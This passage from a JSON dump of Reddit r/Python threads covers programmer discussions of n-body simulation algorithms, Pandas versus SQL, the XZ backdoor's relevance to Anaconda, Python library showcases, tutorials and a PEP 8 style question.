                            "content": "https://m.youtube.com/watch?v=qMLIyZi8Sz0 I found this guest lecture"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "24",
                    "content": "Wow thanks I will look into these things, when posting here I was hoping for comments like this one. What do you mean by object oriented methods? Implementing every particle as an object? But then I couldn't use numpys fast matrix multiplications?",
                    "replies": [
                        {
                            "author": "lolfunctionspace",
                            "score": "16",
                            "content": "Very nice! I wrote something similar to your sim, albeit mine is interactive and you make swarms by clicking ( https://mjsprengel.github.io/gravity/ ) Source code is here: https://github.com/mjsprengel/gravity?files=1 I used the Euler-Cromer integration method. Also known as Semi-implicit euler method. Just thought I'd drop by and share similar work"
                        }
                    ]
                },
                {
                    "author": "timeforscience",
                    "score": "5",
                    "content": "This is awesome, I had no idea it was possible to exceed O(n2) for these calculations. Thanks for posting this."
                },
                {
                    "author": "Astrokiwi",
                    "score": "5",
                    "content": "For gravity n-body simulations, it's more common to use the Barnes-Hut algorithm - I haven't looked into FMM but it seems closely related. Here you clump distant particles together using an oct-tree or quad-tree, but gravity for the clumped cell is just calculated as a monopole. The other thing is a particle-particle particle-mesh method, where you bin masses onto a grid and do some Fourier transforms to work out the large-scale forces, and then add a small n2 sum to calculate short-range forces.",
                    "replies": [
                        {
                            "author": "chinpokomon",
                            "score": "1",
                            "content": "Is that FMM? I've been looking at doing a similar thing using quad-trees (2D and not 3D), for any region of space, the force vector between that and another region seems that it should only need to be calculated as a monopole. A quad-tree of the entire set could allow you find regions, but the tree wouldn't be built just to group masses, it would have a partitioning partly assisted by the distance away from a mass. Essentially each mass would have its own quad-tree representation of the space. I think that this would improve things, but I didn't take it further yet because I don't see a good way for the tree to self-balance and every tree would need to rebalance after collisions, so I think I'm back to high complexity and O(n2). I also considered just using a grid, so that I wouldn't have to do the rebalancing, but I've shifted gears and started looking at shaders now, thinking that I might be able to batch these calculations into something I can run on the GPU compute units in parallel.",
                            "replies": [
                                {
                                    "author": "Astrokiwi",
                                    "score": "2",
                                    "content": "You just rebuild the tree every time, because that's nlogn. You don't worry about balancing the tree, that's not the bottleneck. What you do is for each particle, you propagate from the top of the tree downwards, until you find either leaf nodes, or cells that are smaller than some opening angle from the particle. It's one quad tree, you just don't open it all the way down for every particle. People also do this with kdtrees if you want to try that too. But tree gravity is the default algorithm for big galaxy simulations etc.",
                                    "replies": [
                                        {
                                            "author": "chinpokomon",
                                            "score": "1",
                                            "content": "I assumed there was probably art for that technique, but I haven't explored it further than just thinking about how I might approach it."
                                        }
                                    ]
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "Interesting method, I'll try to implement it, but how do you make sure to not include the particle you want to calculate the force for in the tree? Wouldn't I have to re-calculate the tree for every particle, making the runtime N2 log N? Do you choose theta so the particle can't be in an internal node and don't use the external node the particle is in"
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "One more question: why is it inaccurate to use the center of mass and sum of mass of a group of bodies to calculate the force, compared to calculating the sum of the forces of each individual body?"
                        }
                    ]
                },
                {
                    "author": "jack-of-some",
                    "score": "1",
                    "content": "Speaking of a 1000x increase in speed ... I'll just ... leave this learning resource here. https://www.youtube.com/watch?v=x58W9A2lnQc"
                }
            ]
        },
        {
            "author": "petdance",
            "score": "104",
            "content": "\"First the Earth cooled. And then the dinosaurs came, but they got too big and fat, so they all died and they turned into oil. And then the Arabs came and they bought Mercedes Benzes.\""
        },
        {
            "author": "[deleted]",
            "score": "33",
            "content": "GitHub: https://github.com/phgilde/gravity_simulation"
        },
        {
            "author": "BRENNEJM",
            "score": "41",
            "content": "r/gifsthatendtoosoon I really wanted to see if those last couple particles remained in orbit."
        },
        {
            "author": "quantumwoooo",
            "score": "10",
            "content": "That's so amazing It looks SO COOOOOLLLL Imagine this as a screensaver, or, wallpaper"
        },
        {
            "author": "quantumfoam435",
            "score": "7",
            "content": "So I'm curious. Why a square and not a circle."
        },
        {
            "author": "TheRealMerlin",
            "score": "9",
            "content": "I like how a few of them started orbiting."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "And apparently a blackhole"
        },
        {
            "author": "tb33296",
            "score": "6",
            "content": "Hey, OP, add rotation to the particles and update this please.. Liked it.."
        }
    ]
},
{
    "post_author": "ChristianPacifist",
    "post_id": "1byhpm7",
    "post_score": "92",
    "post_time": "Monday, April 8, 2024 at 1:40:06 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Do folks ever use Pandas when they should use SQL?",
    "media": [],
    "post_content": "I think I see this a lot.\nI believe SQL, including like dataframe SQL packages, should always be used over Pandas when possible unless one is doing something Pandas is more suited to or unless someone requires broader Python control structures or features.\nI am a big believer in sticking to SQL as a baseline data manipulation framework and only using other frameworks if SQL is lacking. One of the biggest ways to accumulate technical debt is solving problems in multiple ways that are not standardized that not all people know.",
    "comments": [
        {
            "author": "ughidkguys",
            "score": "561",
            "content": "SQL and Pandas are two very different things. I would argue that anyone who sees them as substitutes is probably misusing both of them.",
            "replies": [
                {
                    "author": "Eitheror97",
                    "score": "27",
                    "content": "This used to be true, but with libraries like Ibis and dbt in combination with DuckDB you can pretty much get the best of both worlds",
                    "replies": [
                        {
                            "author": "trial_and_err",
                            "score": "4",
                            "content": "Ibis looks interesting!"
                        },
                        {
                            "author": "Working-Mind",
                            "score": "3",
                            "content": "DuckDB is amazing!"
                        }
                    ]
                },
                {
                    "author": "phatboye",
                    "score": "74",
                    "content": "^ This, I use SQL if I need a relational database. I use pandas when I need a data frame. Both have their usage cases. For example, I am not going to spin up a SQL instance to store a handful of addresses. A pandas data frame with suffice for that purpose.",
                    "replies": [
                        {
                            "author": "PaintItPurple",
                            "score": "61",
                            "content": "SQL isn't a database, it's a query language. It is most commonly used with relational databases, but you don't necessarily need to spin anything up to use SQL queries."
                        },
                        {
                            "author": "edbrannin",
                            "score": "5",
                            "content": "I haven’t really used pandas much. What would that buy you over a list of dicts or Address instances, parsed from json?"
                        },
                        {
                            "author": "Cubigami",
                            "score": "17",
                            "content": "Real talk, learn Polars ASAP. Basically Pandas but on Rust bindings. It sped up some of my df queries by 40x"
                        }
                    ]
                },
                {
                    "author": "XtremeGoose",
                    "score": "5",
                    "content": "That might be true from a technological standpoint, but syntactically they are both query languages for tabular data. Look at how much polars looks like sql (hell duckdb is sql) but still acts on dataframes. Equally tools exist that make using relational databases look like pandas. If you are more comfortable in one than the other, it's quite reasonable to extract the data into the one you're more comfortable with to work on it. It actually sounds to me like you don't quite understand the abstractions you're using."
                },
                {
                    "author": "eipi-10",
                    "score": "5",
                    "content": "This is getting a lot of upvotes but I'm not sure I agree -- ultimately, both SQL and Pandas are languages (pandas is probably distinct enough from python to call it a language, although disagreeing on this isn't all that important) for wrangling / querying data. For the vast majority of tasks, you can use either to accomplish the same goal (and generally very similar syntax). I tend to fall in the camp of \"if my data starts in a database, do everything I can in the database before pulling data down\""
                },
                {
                    "author": "__hyphen",
                    "score": "5",
                    "content": "DuckDB entered the chat! They can definitely be the same thing. Pandas is meant to be a database with victor operations, as at the time all databases were row oriented so too slow for aggregation. Pandas proved the need for victorised database and since many victorised databases shows up, including DuckDB which is powered by the same thing that powers Pandas, that’s Arrow engine."
                },
                {
                    "author": "jorge1209",
                    "score": "2",
                    "content": "SQL limited to select and analytic type queries sum() over() are a good deal closer to things like pandas. In fact things like polars/spark blur that line even further. I would say that approaching things from the polars perspective is likely to give better and more maintainable code. Pure SQL is too verbose, Pandas is too mutable. Polars/Spark is a great middle ground."
                },
                {
                    "author": "orgodemir",
                    "score": "3",
                    "content": "The overlap for what they can do is quite large and not recognizing that doesn't really add to the discussion. IMO pandas can be too verbose and harder to write/maintain code as a team. As it's python though your have the flexibility to scale out processes horizontally pretty easily depending on the size of the data, but this is going to add even more infra/code. SQL on the other hand might have fixed hardware running the queries which could make working with large data slow. Some cloud providers let you scale up the compute resources adhoc so that could minimize the issues. If the tables/views being pulled from have indices set up well for your queries, you kinda get parallelism compute for \"free\", which could be good enough to get the output you want. Also it might be more cost effective doing joins on data in a data warehouse then exporting that to a model job vs exporting source tables and joining after."
                },
                {
                    "author": "Classic_Bicycle6303",
                    "score": "1",
                    "content": "Thank you for this. Do you happen to have any resources or literature that compare the relative advantages/disadvantages of either method? I get quite stuck on which ones I would be better to use."
                }
            ]
        },
        {
            "author": "qckpckt",
            "score": "160",
            "content": "I see this kind of mentality from devs all the time. It’s very myopic. It’s easy to look at any one thing in a business codebase and tear it to shreds. There’s almost always a “better” or “more correct” way of doing things. I think devs often don’t realize that this is way more obvious than they think it is. The problem is these things don’t account for the realities of a business. For example, the background and experience levels of the developers who work there, imperfect decisions made in the past, whether or not doing it the “correct” way has any meaningful benefits at all, etc. These things typically fall outside the remit of developers who think this way, and so they’re dismissed as being unimportant. But the reality is, if you are working somewhere that is using pandas in a way where SQL would be more efficient, then that’s almost certainly because the familiarity and comfort levels using SQL are low or nonexistent amongst the developers working there. I’m saying this from experience having worked somewhere where this was exactly the case. A senior technical decision maker saw that we were running into performance and resource issues, and decided that we’d use duckdb instead. It was a total disaster. Performance plummeted through the floor, code was terrible, buggy, inaccurate. People started using duckdb in the worst way you could possibly imagine because it made sense to them based on what they were familiar with. The “best” solution is only the best solution if the people responsible for building and maintaining it know how to use it. It’s easy for devs to massively underestimate how little other devs know about things that they are familiar with. You mention tech debt - I guarantee that the worst cases of tech debt will be ones where a dev has unilaterally decided to use a particular technology because it was “the best” approach, despite it being poorly understood by the rest of the org. In my example, I had to spend months patiently training people on how to work with SQL, and also how to build a mental model of delayed execution frameworks like duckdb, in order to slowly limp the organization back towards being even remotely efficient.",
            "replies": [
                {
                    "author": "ProbsNotManBearPig",
                    "score": "32",
                    "content": "Amen. Everyone on the internet is out to critique others for not doing things the “right” way, but the right way for your teams project is very personal. It’s a combination of many things that people who aren’t intimately familiar with the project aren’t qualified to authoritatively comment on."
                }
            ]
        },
        {
            "author": "mike-manley",
            "score": "89",
            "content": "I mean, Pandas isn't some obscure Python package. But as an experienced SQL data engineer, I tend to gravitate to SQL. That being said, it's good to diversify your data tools and skills when opportunity arises."
        },
        {
            "author": "twitch_and_shock",
            "score": "73",
            "content": "There's plenty of times that exploratory research is being done using local data sets in a way that SQL or another database would be overkill. Pandas also interfaces so well with numpy and other data science and ML libraries that it's just more convenient and efficient to begin trying out ideas with pandas."
        },
        {
            "author": "miemcc",
            "score": "18",
            "content": "Depends on the volume of data and the complexity of the query / transformation. Almost certainly, it will be a combination of both. SQL to filter and pull the information out, and Pandas to deal with anything more complex and transform the data for visualisation. Can it it screwed by using either technique incorrectly? Absolutely! Generally, I would use SQL to filter and pull the information out, possibly group too. But I am normally looking to do multiple transforms. So I'll use Pandas and visualise with bokeh or seaborne."
        },
        {
            "author": "Valeen",
            "score": "29",
            "content": "Should use or can use? People use pandas when they really should be using numpy if they cared about xyz (speed most likely but maybe something else). Hell people use python when they should use C if they cared about flops. Hell why aren't you using cuda? Human resources are finite and sometimes people just need a low friction way to explore data. We have tools for different jobs and it's up to you to decide what to use. Need to explore a new dataset? Pandas. Need to run something daily where cycles count? Do it in SQL."
        },
        {
            "author": "Its_NotTom",
            "score": "9",
            "content": "I really appreciate how quick it is to work with data in pandas (pretty great for working on early stage ML and data science tasks), but yeah I would say that there is most likely an overdependency on it"
        },
        {
            "author": "ChadGPT5",
            "score": "9",
            "content": "SQL is generally better for ETL (extract, transform, load) operations because it is heavily optimized by the server to be fast for those. Pandas is better for EDA (exploratory data analysis) because it is consistent, readable, flexible, and as of 2.0, reasonably optimized. The ideal workflow is to use SQL for joins and filters to get your data into a single table at the granularity you need for analysis, then to actually do your analysis in Pandas. Using SQL to do complex analysis is every bit as inefficient and ugly as downloading 20 base tables and trying to join and filter them in Pandas. As others have said, use the right tool for the right job."
        }
    ]
},
{
    "post_author": "jimtoberfest",
    "post_id": "1bv2wt7",
    "post_score": "12",
    "post_time": "Wednesday, April 3, 2024 at 11:12:46 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "XZ Vulnerability Anaconda",
    "media": [],
    "post_content": "Is the xz library compromised along with the xz Linux utility?\nAnaconda seems to auto load this library upon creation of new venvs.",
    "comments": [
        {
            "author": "dosmeyer",
            "score": "16",
            "content": "Anaconda claims that their XZ code base is unaffected by the hack. See their blog for more info.",
            "replies": [
                {
                    "author": "Due_Swing_2282",
                    "score": "-1",
                    "content": "Not affected by the known backdoor in the recent version. Maybe I'm being paranoid, but I've reinstalled my OS and been spending the last few days trying to figure out ways to easily set up new VMs for each project instead of a Conda environment. While there's a slim chance there are still undetected backdoors lurking in Jia Tans xz code, it's not just xz. Even if there's no more backdoors in xz, was this the only one? Have they infiltrated more open source projects with undetected backdoors? For me at least I feel its time to start using VMs a bit more. While I would be extremely surprised if any intelligence service in the world has the slightest interest in me, that's not the only possibility. It could for example that the Russians are planning a major cyberattack against western interests, including any company or citizen with a backdoor installed, and simply wants to wreak havoc by deleting hard drives or who knows what.",
                    "replies": [
                        {
                            "author": "draeath",
                            "score": "5",
                            "content": "trying to figure out ways to easily set up new VMs for each project instead of a Conda environment Containers. You want containers."
                        },
                        {
                            "author": "binlargin",
                            "score": "2",
                            "content": "As the other person said, look at devcontainers."
                        },
                        {
                            "author": "Equivalent_Loan_8794",
                            "score": "1",
                            "content": "I'd actually spend time learning about the upstream/distribution model for software and why long term support for kernel versions is usually a major version behind.... that is, before you embark on a retooling venture based on feelings."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Due_Swing_2282",
            "score": "17",
            "content": "It is something I worry about. While the known sshd vulnerability is not included in the versions of xz that Anaconda uses, it still contains a lot of code committed by the malicious maintainer \"Jia Tan\". Who knows what might hide in there. As you can see from this debian bug reports discussion, Jia Tan has made more than 700 commits to xz and the majority of these are found in version 5.4.5 used by Anaconda. I'll just paste the relevant comment from the Debian discussion here: I count a minimum of 750 commits or contributions to xz by Jia Tan, who backdoored it. This includes all 700 commits made after they merged a pull request in Jan 7 2023, at which point they appear to have already had direct push access, which would have also let them push commits with forged authors. Probably a number of other commits before that point as well. Reverting the backdoored version to a previous version is not sufficient to know that Jia Tan has not hidden other backdoors in it. Version 5.4.5 still contains the majority of those commits. Commits by them such as 18d7facd3802b55c287581405c4d49c98708c136 and ae5c07b22a6b3766b84f409f1b6b5c100469068a show that they were deep into analyzing the security of xz. They were well placed to insert a buffer overflow that could allow eg, a targeted xz file to cause arbitrary code execution. The impact of such a security hole could be much more stealthy and bad than the known backdoor since it would allow chaining xz with other unrelated software releases on an ongoing basis. The package should be reverted to a version before their involvement, which started with commit 6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4. Or their early commits vetted and revert to a later point, but any arbitrary commit by a known bad and malicious actor almost certainly has less value than the risk that a subtle change go unnoticed. I'd suggest reverting to 5.3.1. Bearing in mind that there were security fixes after that point for ZDI-CAN-16587 that would need to be reapplied. I count a minimum of 750 commits or contributions to xz by Jia Tan, who backdoored it.",
            "replies": [
                {
                    "author": "inspectoroverthemine",
                    "score": "7",
                    "content": "You have the same text twice in the quote."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bm6ytl",
    "post_score": "6",
    "post_time": "Sunday, March 24, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "business24_ai",
            "score": "2",
            "content": "Working on semantic search for YouTube Videos and jump directly to video location. Need help to figure out best chunking strategy for RAG. Github with Jupyter notebooks are on GitHub. https://github.com/business24ai/yt_research"
        },
        {
            "author": "thereal0ri_",
            "score": "1",
            "content": "I've been working on my PolyLock project. Essentially allowing you to take your python code and encrypt it then obfuscate the encrypted data. Thus giving you a result where you need a key In order to execute the code. https://github.com/therealOri/PolyLock Other than that, I've been been helping maintain and working on a way to interact with a Minecraft server through a discord bot. https://github.com/kitOSx/Serverbot"
        },
        {
            "author": "Civil-Equivalent-206",
            "score": "1",
            "content": "Getting started with python: https://www.youtube.com/watch?v=e-K-UeOZIvM"
        },
        {
            "author": "Accomplished_Ad_5697",
            "score": "0",
            "content": "Hello :598: community! I have created a script to predict stock price using the 60-day moving average strategy. Unfortunately, when I run my script, I do not get an output for the print(f\"Prediction: {prediction}\") [line 108]. There are no errors, and my graph is displayed too. However, the numeric prediction is not returned and is loading for a long time. I left it run for 45 minutes and nothing has changed. You will input a stock TICKER symbol, a start date and an end date. Using a 60-day average, it will return the expected price. Below is a link to my GitHub: https://github.com/redwooma/Bug/blob/main/Stock_Price.py"
        }
    ]
},
{
    "post_author": "neb2357",
    "post_id": "1bpyduk",
    "post_score": "120",
    "post_time": "Thursday, March 28, 2024 at 6:29:50 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Automating Python with Google Cloud",
    "media": [
        "https://www.scipress.io/post/rSp9Rov4ppvHgpHQaRPy/Automating-Python-with-Google-Cloud",
        "https://www.scipress.io/post/FA9QzMVdssdMt4IYq0yX/Automating-Python-with-Google-Cloud-Run",
        "https://www.scipress.io/post/ZxywtSFdx5In7KTrVvNA/Automating-Python-with-Google-Cloud-Functions"
    ],
    "post_content": "I just published a tutorial series on how to automate a Python script in Google Cloud using Cloud Functions and/or Cloud Run. Feedback would be great. Thanks!\nAutomating Python with Google Cloud\nAutomating Python with Google Cloud Functions\nAutomating Python with Google Cloud Run",
    "comments": [
        {
            "author": "putrid_nails",
            "score": "4",
            "content": "This is very cool"
        },
        {
            "author": "RevolutionaryRain941",
            "score": "6",
            "content": "This tutorial is great. I really wanted to learn this.",
            "replies": [
                {
                    "author": "neb2357",
                    "score": "2",
                    "content": "Appreciate the nice review! Let me know if you find any bugs or confusing sections."
                }
            ]
        },
        {
            "author": "I_am_not_doing_this",
            "score": "3",
            "content": "very cool. Google Cloud documentations and Google Cloud Console is a mess",
            "replies": [
                {
                    "author": "NationalMyth",
                    "score": "3",
                    "content": "Is it? There's a lot of info there but, there's a lot of tooling going on as well. Lots of things seemingly have similar functionality, but can be better tuned for a service or other products. Our team uses GCP for 80% of our workflow and we're all fans."
                }
            ]
        },
        {
            "author": "Dev-N-Danger",
            "score": "3",
            "content": "Unless you’re behind a proxy",
            "replies": [
                {
                    "author": "--red",
                    "score": "4",
                    "content": "Why is this guy being downvoted?"
                }
            ]
        },
        {
            "author": "JohnnyHammersticks27",
            "score": "1",
            "content": "The videos are awesome! What did you use to make them?",
            "replies": [
                {
                    "author": "neb2357",
                    "score": "2",
                    "content": "Screen Studio Thanks!"
                }
            ]
        },
        {
            "author": "gabethebabeXDXD",
            "score": "1",
            "content": "I am just an amateur when it comes to python, but I’ve managed to use it to build out an ETL process that grabs data from a few different sources (SQL server, API responses, share point file paths, etc.), performs some simple data comparison, and pushes the data to a SQL server that feeds some BI reports. In order to run the script successfully, I need to be logged in to my company’s VPN (for share point and SQL server access). I’ve have tried and failed several times to automate this script - the closest of which I’ve gotten is using task scheduler on a company VM that successfully executes some (but not all) of the code (which runs fine when I’m logged in). All of this to ask - do you think Google cloud could be a relatively simple yet more robust solution than Task Scheduler? I found Airflow/Prefect ideal but far out of my league to easily deploy… I’m not a programmer and my day job keeps me tied up!"
        }
    ]
},
{
    "post_author": "sepandhaghighi",
    "post_id": "1buurf7",
    "post_score": "29",
    "post_time": "Wednesday, April 3, 2024 at 6:00:06 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Nava: Python Light-Weight Sound-Player Library",
    "media": [
        "https://github.com/openscilab/nava",
        "https://github.com/pygame/pygame",
        "https://github.com/TaylorSMarks/playsound"
    ],
    "post_content": "GitHub Repo: https://github.com/openscilab/nava\nWhat My Project Does:\nNava is a Python library that allows users to play sound in Python without any dependencies or platform restrictions. It is a cross-platform solution that runs on any operating system, including Windows, macOS, and Linux. Its lightweight and easy-to-use design makes Nava an ideal choice for developers looking to add sound functionality to their Python programs.\nimport time\nfrom nava import play, stop\nsound_id = play(\"alarm.wav\", async_mode=True, loop=False)\ntime.sleep(4)\nstop(sound_id)\nTarget Audience:\nDevelopers who are looking to add sound functionality to their Python programs\nComparison:\nLight-weight and zero-dependency against pygame library. It can be inconvenient to install the pygame library just for playing sounds!\nplaysound is deprecated and it's impossible to use it in modern environments. It also has some bugs on macOS and doesn't support the stop function.",
    "comments": [
        {
            "author": "AngoGablogian_artist",
            "score": "2",
            "content": "This makes me want to get my micropython board out and make another portable music player."
        },
        {
            "author": "houseofleft",
            "score": "2",
            "content": "Oh nice! I wrote a fun little CLI mp3 player (https://github.com/benrutter/mpy3) and went the way of using the whole pygame library which worked well but is a way bigger dependency than necessary. I'm for sure gonna test out swapping in nava instead!"
        },
        {
            "author": "ArtOfWarfare",
            "score": "1",
            "content": "Hi 👋🏻 Testing playsound against every version of Python, Windows, macOS, and Linux distro just wasn’t possible. Early on I just naively accepted every pull request, but that caused a lot of regressions on other platforms. I pleaded with people to write tests cases demonstrating their issues + that their PRs would fix them, and also that would run on Travis against a wide variety of platforms. Nobody ever did that. I stopped accepting anything or pushing updates because at the very least it already works where it does. I didn’t want to push updates of dubious value just to break it on other platforms. Good luck with this."
        }
    ]
},
{
    "post_author": "AlSweigart",
    "post_id": "k4rxw0",
    "post_score": "1659",
    "post_time": "Tuesday, December 1, 2020 at 10:22:32 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "\"Automate the Boring Stuff with Python\" online course is free to sign up for the next few days with code DEC2020FREE",
    "media": [
        "https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/",
        "https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW",
        "https://inventwithpython.com/",
        "https://inventwithpython.com/automateudemy",
        "https://automatetheboringstuff.com/2e/",
        "https://www.udemy.com/course/automate/?couponCode=DEC2020FREE",
        "https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F"
    ],
    "post_content": "https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)\nYou can also click this link or manually enter the code: DEC2020FREE\nhttps://www.udemy.com/course/automate/?couponCode=DEC2020FREE\nThis promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to DEC2020FREE2 on the 4th.\nUdemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. I won't be able to make codes after this period, but I will be making free codes next month. Meanwhile, the first 15 of the course's 50 videos are free on YouTube.\nYou can also purchase the course at a discount using my code DEC2020 or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)\nFrequently Asked Questions: (read this before posting questions)\nThis course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.\nIf you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.\nThis Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com\nThe 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/\nI do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.\nIt's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.\nI wrote a blog post to cover what's new in the second edition\nYou're not too old to learn to code. You don't need to be \"good at math\" to be good at coding.\nSigning up is the first step. Actually finishing the course is the next. :) There are several ways to get/stay motivated. I suggest getting a \"gym buddy\" to learn with.",
    "comments": [
        {
            "author": "[deleted]",
            "score": "44",
            "content": "Thank you Al! I love your books, and looking forward to your new book out this month!",
            "replies": [
                {
                    "author": "af_vet_2009",
                    "score": "0",
                    "content": "Link?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "3",
                            "content": "His new book is continuation of this course. I'm not sure if he'll be creating new udemy course for this, but you can buy the book this month. https://nostarch.com/beyond-basic-stuff-python"
                        },
                        {
                            "author": "wbcm",
                            "score": "-1",
                            "content": "http://letmegooglethat.com/?q=%22Automate+the+Boring+Stuff+with+Python%22"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Theonetheycallgreat",
            "score": "41",
            "content": "Can I also shout out Udemy for not making me put in a credit card like some other sites do even for free content."
        },
        {
            "author": "Dejan1324",
            "score": "22",
            "content": "Man, on behalf of all broke ass IT students, i wanna say thanks from the bottom of my heart. This is amazing. You are a great guy my man."
        },
        {
            "author": "GChan129",
            "score": "12",
            "content": "When I first saw this I thought \"Nuts! I just bought this a few days ago.\" Then I thought, \"Nah, take my money you beautiful bastard.\" Thoroughly enjoying the course so far :D"
        },
        {
            "author": "PerfectlyStill",
            "score": "10",
            "content": "If anyone's reading this and is AT ALL interesting in a fun and practical approach to programming, I highly recommend anything created by Al. His first book is almost solely responsible for giving me the courage to pursue a career in programming. Once you experience those breakthrough moments you'll never look back."
        },
        {
            "author": "MayorofRavenholm",
            "score": "5",
            "content": "As someone who loves Python and wants to get better at it without spending a penny, thank you very much."
        },
        {
            "author": "Ok_Computer_Science",
            "score": "3",
            "content": "Thank you!!!"
        },
        {
            "author": "thenerdy",
            "score": "2",
            "content": "This is super duper awesome thanks a barrel of fuckton!"
        },
        {
            "author": "StayinYoung87",
            "score": "2",
            "content": "Thank you for this. I took a few courses with Python in school and I've been looking for more stuff to keep me going with it. Thank you again!"
        }
    ]
},
{
    "post_author": "lhad89",
    "post_id": "en884v",
    "post_score": "1705",
    "post_time": "Saturday, January 11, 2020 at 5:46:08 PM GMT+3",
    "flair_text": "",
    "post_title": "I wrote a little python package to render images as continuous lines with varying thicknesses using matplotlib",
    "media": [
        "https://i.redd.it/yp7mktx5w5a41.png",
        "https://preview.redd.it/yp7mktx5w5a41.png?width=640&crop=smart&auto=webp&s=68780d35e9ab49c8c3a226e903f294bac78f2e30"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "lhad89",
            "score": "114",
            "content": "source code here: https://github.com/lucashadfield/speck",
            "replies": [
                {
                    "author": "baahalex",
                    "score": "31",
                    "content": "Never hit that star button faster"
                }
            ]
        },
        {
            "author": "knestleknox",
            "score": "68",
            "content": "you should MIT license it! (if you want of course). I'm sure lots of people would want to use this for projects and would be worried about licensing issues.",
            "replies": [
                {
                    "author": "lhad89",
                    "score": "45",
                    "content": "Good call. I've added an MIT license to the repo."
                },
                {
                    "author": "nostril_extension",
                    "score": "2",
                    "content": "Or better yet GPL it.",
                    "replies": [
                        {
                            "author": "69shaolin69",
                            "score": "1",
                            "content": "Yes"
                        },
                        {
                            "author": "lhad89",
                            "score": "1",
                            "content": "Why GPL in this case? I'll be honest, I don't really know the difference."
                        }
                    ]
                },
                {
                    "author": "iekiko89",
                    "score": "1",
                    "content": "for those of us just looking into python do you have a good link for a read up on mit license?",
                    "replies": [
                        {
                            "author": "knestleknox",
                            "score": "5",
                            "content": "Sure! Github has a nice writeup here which links to an even more in-depth explanation for licenses here. You can find the MIT license explanation here. Also (I can't tell if you're implying this or not) but licensing is more of a software thing in general -not specifically a python thing."
                        },
                        {
                            "author": "yvrelna",
                            "score": "1",
                            "content": "Just read the license itself for a start. MIT license is one of the shortest license there is. But if you need the TL;DR version anyway, it's \"you can do whatever you want with it, as long as you keep the attribution and license notice\"."
                        }
                    ]
                }
            ]
        },
        {
            "author": "maxbridgland",
            "score": "25",
            "content": "I just can't seem to curb my enthusiasm with this, it's so cool. Well done!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bonik1",
    "post_score": "0",
    "post_time": "Wednesday, March 27, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "groosha",
            "score": "2",
            "content": "Hi! Not a beginner, but I think it's worth reading for those who start learning Python. PEP 8 says (quote starts): Don’t compare boolean values to True or False using ==: # Correct: if greeting: # Wrong: if greeting == True: Worse: # Wrong: if greeting is True: (end of quote) One thing I don't understand is why \"if greeting is True\" is \"Worse\" and not \"The Best\". Checking for \"is True\" ensures that \"greeting\" is boolean, and not, for example, a string or list or anything else. Even Flake8 considers the last option as best practice, opposite of PEP 8 (https://www.flake8rules.com/rules/E712.html) Also the last option is literally \"explicit is better than implicit\". So what's your opinion on this?",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "1",
                    "content": "Depends what you want to check for - usually you aren't interested if it's boolean True or other value as the variable should have well defined context/meaning. \"None\" is the more likely case for checking if something can be nullable and not just true/false (and one of clean code aspects is to avoid None and constant checking too)",
                    "replies": [
                        {
                            "author": "Kiuhnm",
                            "score": "1",
                            "content": "and one of clean code aspects is to avoid None and constant checking too I don't see anything wrong with checking for None. Guidelines are OK, but I think some people take things a little too far. One should still be able to have a personality, a personal style, and a free opinion about most things. Also, our minds don't all work the same, so writing the code the same exact way doesn't make much sense. I'm flexible enough to read code that's a little different from the code I would've written. That's just me, though, an individualist.",
                            "replies": [
                                {
                                    "author": "riklaunim",
                                    "score": "1",
                                    "content": "More like you should not re-check it. Like if you have an optional list of reciepients then for example class init should check if it's none and then replace it with empty list so that the code lower doesn't have to check. Or how Django request.user is either User object or AnonymousUser object, it's never None."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Kiuhnm",
                    "score": "1",
